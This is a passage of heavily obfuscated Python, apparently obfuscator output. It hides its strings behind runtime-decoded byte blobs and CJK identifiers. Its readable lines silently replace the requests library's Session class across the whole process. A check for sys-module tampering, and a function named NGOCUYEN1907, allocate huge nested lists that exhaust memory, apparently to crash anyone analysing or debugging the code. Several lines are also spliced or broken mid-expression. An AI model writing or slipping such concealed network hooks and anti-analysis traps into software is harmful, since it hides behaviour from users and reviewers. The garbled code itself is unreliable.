(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()]}

            def __setstate__(self, state):
                for attr, value in state.items():
                    setattr(self, attr, value)

try:
    match '輁臗厒庍氞搼' == '调苈瓬蜥辄茶':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            罆弞揼灋撞摕 = [[True], [False]]
            暽掇財豥硿淳(['外棐鏎鲁漪炻'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 箐聡斅庇蔋睦:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722254722, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722258910, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722252823, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722247554, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722243230, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722242758]))))())())() == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                玶孀詃翣磭榖 = [[(lambda: (lambda 庘藊倐醌挥懆: 庘藊倐醌挥懆 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 忹膥笟撸欸廘: 忹膥笟撸欸廘 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 俧吏騞沴鲿闅:

        def request(method, url, **kwargs):
            with Session() as session:
                return session.request(method=method, url=url, **kwargs)
try:
    match '垖苵衣烰糖柗' == '稽鹚蟒蛓兿鯩':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            軇鳡鐸候朗鹑 = [[True], [False]]
            暽掇財豥硿淳(['莠悽閔搨達诬'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 龰纮呇貈蔣阡:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                窔埧鮥房粬朿 = [[(lambda: (lambda 裗頱歽秭渗鸝: 裗頱歽秭渗鸝 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 钉旌衴覥嶡杬: 钉旌衴覥嶡杬 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722253197, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722252889, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722257951, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722259682, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722254174, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722261838]))))())())()])
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 谒攤瓳髷碫翷:

        def get(url, params=None, **kwargs):
            kwargs.setdefault((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x10'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())(), (lambda: (lambda 绎鍝帹渞灺銴: 绎鍝帹渞灺銴 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())())
            return request((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())(), url, params=params, **kwargs)
try:
    match '负碦俗怡甗杓' == '郅闥聶姡橠疾':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            栯視丫刾催熳 = [[True], [False]]
            暽掇財豥硿淳(['裼賺雀煳累續'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 蚹娢籈蒮稿緼:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722242459, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722259845, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722249521, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722253888, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722243250, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722249785]))))())())() == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                叐烞檓汮戒郕 = [[(lambda: (lambda 劄糄奖柡儔欋: 劄糄奖柡儔欋 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 黑懋笳郼倽鱤: 黑懋笳郼倽鱤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 泍搤銞嚤岏庑:

        def post(url, data=None, json=None, **kwargs):
            return request((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())(), url, data=data, json=json, **kwargs)
try:
    match '劋晇夯聲樵鶝' == '鬯侓輝澍撟榠':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            浑镋鸤妜萕颫 = [[True], [False]]
            暽掇財豥硿淳(['卬嚛篙耈型袤'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 鮴屚尿珢仴卡:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                錛鋪誇俤濕桹 = [[(lambda: (lambda 芢軱艬榥狫夺: 芢軱艬榥狫夺 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 屠芣漥浿瘂櫏: 屠芣漥浿瘂櫏 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 徕捜雅秗凓撊:
        __import__("requests").Session = Session
try:
    match '窳濛鱼璙禀睇' == '惋膸镝綣蚥蘄':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            邏頜罱驧娏膵 = [[True], [False]]
            暽掇財豥硿淳(['垂攪烳瀻槻氶'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 簿嚟詴峮堕襘:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                憬鐧旑浼蹙狎 = [[(lambda: (lambda 么旖繅砸惾惋: 么旖繅砸惾惋 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 灕樄皧荁珃蜯: 灕樄皧荁珃蜯 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 帰蚋堉鐟鯻匃:

        def NGOCUYEN1907():
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '磓齨籩摮蠫癖' == '蒒笃损脥貖櫪':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            漒倨朩鴉鲺賁 = [[True], [False]]
            暽掇財豥硿淳(['籑尶汀砸祟皂'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 嗘菕罀榌欵兕:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                忑纠俢鉷濩徯 = [[(lambda: (lambda 縡霴溁譗茒厱: 縡霴溁譗茒厱 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 鹯琭攓廧鍹劶: 鹯琭攓廧鍹劶 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 渘砰妚瓥榽趁:
        if str(__import__('sys')) != "<module 'sys' (built-in)>":
            [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '鷨鞀靉鍎满軜' == '爌畢暍文肩蛈':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            驐勅墥铩辤獵 = [[True], [False]]
            暽掇財豥硿淳(['厹睖瞶叢筥欑'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 囩豮珛陜琈馔:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
